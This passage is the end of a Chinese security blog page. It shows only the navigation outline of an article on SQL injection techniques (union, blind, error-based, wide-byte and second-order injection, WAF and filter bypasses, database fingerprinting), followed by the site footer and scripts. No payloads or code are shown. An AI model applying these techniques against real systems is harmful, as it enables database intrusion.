class="nav-text">四、常用函数、基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%B3%BB%E7%BB%9F%E5%87%BD%E6%95%B0"><span class="nav-text">系统函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9E%E6%8E%A5%E5%87%BD%E6%95%B0"><span class="nav-text">字符串连接函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%A4%E7%A7%8D%E6%B3%A8%E9%87%8A"><span class="nav-text">两种注释</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sql%E4%B8%AD%E7%9A%84%E9%80%BB%E8%BE%91%E8%BF%90%E7%AE%97"><span class="nav-text">sql中的逻辑运算</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#order-by"><span class="nav-text">order by</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%B3%BB%E7%BB%9F%E6%95%B0%E6%8D%AE%E5%BA%93%EF%BC%88information-schema%EF%BC%89"><span class="nav-text">系统数据库（information_schema）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%E3%80%81%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="nav-text">五、注入类型</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%88%86%E7%B1%BB"><span class="nav-text">SQL注入的分类</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="nav-text">联合注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E5%9E%8B"><span class="nav-text">字符型</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="nav-text">堆叠注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B1%80%E9%99%90%E6%80%A7"><span class="nav-text">局限性</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E6%80%9D%E8%B7%AF"><span class="nav-text">常见思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81bypass"><span class="nav-text">常见bypass</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="nav-text">布尔盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%88%AA%E5%8F%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"><span class="nav-text">截取字符串常用函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B2%E6%B3%A8%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95"><span class="nav-text">盲注常用方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="nav-text">时间盲注</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-text">报错注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E7%9B%B2%E6%B3%A8%E2%80%93floor%E6%8A%A5%E9%94%99"><span class="nav-text">报错盲注–floor报错</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#xpath%E8%AF%AD%E6%B3%95%E9%94%99%E8%AF%AF%E2%80%93%E8%BE%83%E5%B8%B8%E7%94%A8"><span class="nav-text">xpath语法错误–较常用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Join-using-%E6%B3%A8%E5%88%97%E5%90%8D"><span class="nav-text">Join using()注列名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#GTID%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="nav-text">GTID相关函数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA%E6%96%87%E4%BB%B6"><span class="nav-text">导入导出文件</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E9%99%90%E5%88%B6"><span class="nav-text">查看限制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#load-file-%E5%AF%BC%E5%87%BA%E6%96%87%E4%BB%B6"><span class="nav-text">load_file()导出文件</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="nav-text">二次注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E6%80%9D%E8%B7%AF-1"><span class="nav-text">常见思路</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="nav-text">宽字节注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="nav-text">相关函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#gbk%E7%BC%96%E7%A0%81"><span class="nav-text">gbk编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#utf8%E7%BC%96%E7%A0%81%E3%80%81Latin1%E7%BC%96%E7%A0%81"><span class="nav-text">utf8编码、Latin1编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D"><span class="nav-text">修复</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BA%A6%E6%9D%9F%E6%94%BB%E5%87%BB"><span class="nav-text">约束攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#order-by-%E5%90%8E%E7%9A%84%E6%B3%A8%E5%85%A5"><span class="nav-text">order by 后的注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#order-by%E5%8F%82%E6%95%B0%E5%90%8E%E6%B3%A8%E5%85%A5"><span class="nav-text">order by参数后注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#procedure-analyse-%E5%8F%82%E6%95%B0%E5%90%8E%E6%B3%A8%E5%85%A5"><span class="nav-text">procedure analyse 参数后注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA%E6%96%87%E4%BB%B6into-outfile-%E5%8F%82%E6%95%B0"><span class="nav-text">导入导出文件into outfile 参数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AD%E3%80%81%E5%B8%B8%E8%A7%81bypass"><span class="nav-text">六、常见bypass</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Information-schema%E8%A2%AB%E5%B1%8F%E8%94%BD%E6%88%96%E8%BF%87%E6%BB%A4or%E6%97%B6"><span class="nav-text">Information_schema被屏蔽或过滤or时</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#select%E8%A2%AB%E8%BF%87%E6%BB%A4"><span class="nav-text">select被过滤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WAF%E7%BB%95%E8%BF%87%E2%80%93%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="nav-text">WAF绕过–服务器解析漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A9%BA%E6%A0%BC%E8%A2%AB%E8%BF%87%E6%BB%A4"><span class="nav-text">空格被过滤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E5%8D%95%E5%BC%95%E5%8F%B7"><span class="nav-text">过滤单引号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E5%85%B3%E9%94%AE%E5%AD%97"><span class="nav-text">过滤关键字</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AD%89%E4%BB%B7%E5%87%BD%E6%95%B0%E6%88%96%E5%8F%98%E9%87%8F"><span class="nav-text">等价函数或变量</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B"><span class="nav-text">判断数据库类型</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E7%AB%AF%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B"><span class="nav-text">前端与数据库类型</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A0%B9%E6%8D%AE%E7%89%B9%E6%9C%89%E5%87%BD%E6%95%B0%E5%88%A4%E6%96%AD"><span class="nav-text">根据特有函数判断</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#len%E5%92%8Clength"><span class="nav-text">len和length</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#version%E5%92%8C-version"><span class="nav-text">version和@@version</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#substring%E5%92%8Csubstr"><span class="nav-text">substring和substr</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%B9%E6%8D%AE%E7%89%B9%E6%AE%8A%E7%AC%A6%E5%8F%B7%E8%BF%9B%E8%A1%8C%E5%88%A4%E6%96%AD"><span class="nav-text">根据特殊符号进行判断</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%B9%E6%8D%AE%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AF%B9%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%A4%84%E7%90%86%E6%96%B9%E5%BC%8F%E5%88%A4%E6%96%AD"><span class="nav-text">根据数据库对字符串的处理方式判断</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%B9%E6%8D%AE%E6%95%B0%E6%8D%AE%E5%BA%93%E7%89%B9%E6%9C%89%E7%9A%84%E6%95%B0%E6%8D%AE%E8%A1%A8%E6%9D%A5%E5%88%A4%E6%96%AD"><span class="nav-text">根据数据库特有的数据表来判断</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%B9%E6%8D%AE%E7%9B%B2%E6%B3%A8%E7%89%B9%E5%88%AB%E5%87%BD%E6%95%B0%E5%88%A4%E6%96%AD"><span class="nav-text">根据盲注特别函数判断</span></a></li></ol></li></ol></li></ol>

    </div>
</div>
        </div>
    
</div>



                

            </div>

            

        </div>

        <div class="main-content-footer">
            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
              <span>2022</span>
              -
            
            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Sl0th</a>
            
                
                <p class="post-count space-x-0.5">
                    <span>
                        共撰写了 47 篇文章
                    </span>
                    
                </p>
            
        </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.7.3</a></span>
        </div>
        
        
            <div>
                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="article-tools-list">
        <!-- TOC aside toggle -->
        
            <li class="right-bottom-tools page-aside-toggle">
                <i class="fa-regular fa-outdent"></i>
            </li>
        

        <!-- go comment -->
        
            <li class="go-comment">
                <i class="fa-regular fa-comments"></i>
            </li>
        
    </ul>
</div>

        </div>
    

    <div class="right-side-tools-container">
        <div class="side-tools-container">
    <ul class="hidden-tools-list">
        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
            <i class="fa-regular fa-magnifying-glass-plus"></i>
        </li>

        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
            <i class="fa-regular fa-magnifying-glass-minus"></i>
        </li>

        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
            <i class="fa-regular fa-moon"></i>
        </li>

        <!-- rss -->
        

        

        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
            <i class="fa-regular fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="visible-tools-list">
        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
            <i class="fa-regular fa-cog fa-spin"></i>
        </li>
        
            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
                <i class="arrow-up fas fa-arrow-up"></i>
                <span class="percent"></span>
            </li>
        
        
    </ul>
</div>

    </div>

    <div class="image-viewer-container">
    <img src="">
</div>


    

</main>


    
<script src="/js/libs/Swup.min.js"></script>

<script src="/js/libs/SwupSlideTheme.min.js"></script>

<script src="/js/libs/SwupScriptsPlugin.min.js"></script>

<script src="/js/libs/SwupProgressPlugin.min.js"></script>

<script src="/js/libs/SwupScrollPlugin.min.js"></script>

<script src="/js/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>







<script src="/js/tools/imageViewer.js" type="module"></script>

<script src="/js/utils.js" type="module"></script>

<script src="/js/main.js" type="module"></script>

<script src="/js/layouts/navbarShrink.js" type="module"></script>

<script src="/js/tools/scrollTopBottom.js" type="module"></script>

<script src="/js/tools/lightDarkSwitch.js" type="module"></script>

<script src="/js/layouts/categoryList.js" type="module"></script>





    
<script src="/js/tools/codeBlock.js" type="module"></script>




    
<script src="/js/layouts/lazyload.js" type="module"></script>




    
<script src="/js/tools/runtime.js"></script>

    
<script src="/js/libs/odometer.min.js"></script>

    
<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">




  
<script src="/js/libs/Typed.min.js"></script>

  
<script src="/js/plugins/typed.js" type="module"></script>








    
<script src="/js/libs/anime.min.js"></script>





    
<script src="/js/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>

<script src="/js/layouts/toc.js" type="module" data-swup-reload-script=""></script>

<script src="/js/plugins/tabs.js" type="module" data-swup-reload-script=""></script>




<script src="/js/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>


<script src="/js/layouts/essays.js" type="module" data-swup-reload-script=""></script>




</body>
</html>
